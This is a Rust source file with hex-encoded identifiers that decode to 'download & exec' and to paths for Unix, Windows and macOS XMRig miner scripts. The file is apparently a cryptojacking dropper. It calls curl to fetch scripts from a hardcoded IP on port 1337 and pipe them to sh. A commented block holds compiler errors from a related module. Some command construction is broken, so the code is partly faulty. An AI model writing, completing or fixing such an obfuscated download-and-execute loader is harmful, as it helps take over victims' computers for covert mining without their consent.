use std::process::Command;

pub fn main() {
    _0x646f776e6c6f616420262065786563();
}




/* // TODO: fix error
error[E0599]: no method named `text` found for enum `Result` in the current scope
  --> src/_0x786d726967/main.rs:21:53
   |
21 |         let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
   |                                                     ^^^^ method not found in `Result<Response, reqwest::Error>`

error[E0599]: no method named `text` found for enum `Result` in the current scope
  --> src/_0x786d726967/main.rs:33:53
   |
33 |         let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
   |                                                     ^^^^ method not found in `Result<Response, reqwest::Error>`

error[E0599]: no method named `text` found for enum `Result` in the current scope
  --> src/_0x786d726967/main.rs:45:53
   |
45 |         let _0x636f6e74656e74 = _0x726573706f6e7365.text().await;
   |                                                     ^^^^ method not found in `Result<Response, reqwest::Error>`
 */

#[tokio::main]
async fn _0x646f776e6c6f616420262065786563() {
    if cfg!(unix) {
        Command::new("curl")
            .arg("-sSf")
            .arg("http://150.136.245.71:1337/0x786d7273637269707473/.0x756e6978786d726967")
            .arg("|")
            .arg("sh")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
    } else if cfg!(windows) {
        Command::new("curl -sSf http://150.136.245.71:1337/0x786d7273637269707473/0x77696e786d726967.bat")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
    } else if cfg!(target_os = "macos") {
        Command::new("curl -sSf http://150.136.245.71:1337/0x786d7273637269707473/.0x6d6163786d726967 | sh")
            .spawn()
            .expect("0x4661696c656420746f206578656375746520636f6d6d616e64");
    }
}
